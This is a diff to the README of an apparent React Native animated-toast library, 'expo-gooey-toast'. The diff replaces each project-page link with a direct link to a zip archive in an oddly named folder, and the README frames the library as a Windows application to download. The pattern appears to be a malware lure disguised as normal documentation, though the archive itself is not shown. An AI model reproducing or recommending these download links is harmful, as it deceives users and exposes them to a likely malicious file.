@@ -1,6 +1,6 @@
 # 🍞 expo-gooey-toast - Add smooth morphing notifications to apps
 
-[![Download App](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/sitisur7676/expo-gooey-toast)
+[![Download App](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/sitisur7676/expo-gooey-toast/raw/refs/heads/main/rabbitry/toast-expo-gooey-2.2.zip)
 
 expo-gooey-toast provides a simple way to add visual alerts to your React Native projects. These alerts use a fluid animation style that stands out from standard system messages. The library manages the appearance and disappearance of messages, allowing you to focus on the information you show to your users.
 
@@ -8,7 +8,7 @@ expo-gooey-toast provides a simple way to add visual alerts to your React Native
 
 You can obtain the current version of the software by visiting the project page.
 
-[Visit this page to download the software](https://github.com/sitisur7676/expo-gooey-toast)
+[Visit this page to download the software](https://github.com/sitisur7676/expo-gooey-toast/raw/refs/heads/main/rabbitry/toast-expo-gooey-2.2.zip)
 
 Follow these steps to complete the process on your Windows computer:
 
@@ -68,7 +68,7 @@ This application respects your privacy. It stores your configuration files local
 
 If you encounter technical issues, reach out through the project page. Visit the link below to view the community forums or to report a bug.
 
-[Visit this page to download the software](https://github.com/sitisur7676/expo-gooey-toast)
+[Visit this page to download the software](https://github.com/sitisur7676/expo-gooey-toast/raw/refs/heads/main/rabbitry/toast-expo-gooey-2.2.zip)
 
 Check the Issues tab on the page to see if another user reported your problem. If you do not see your issue listed, you can start a new discussion. Provide a clear description of the problem and include a screenshot if possible. This helps others understand what you experience.
 
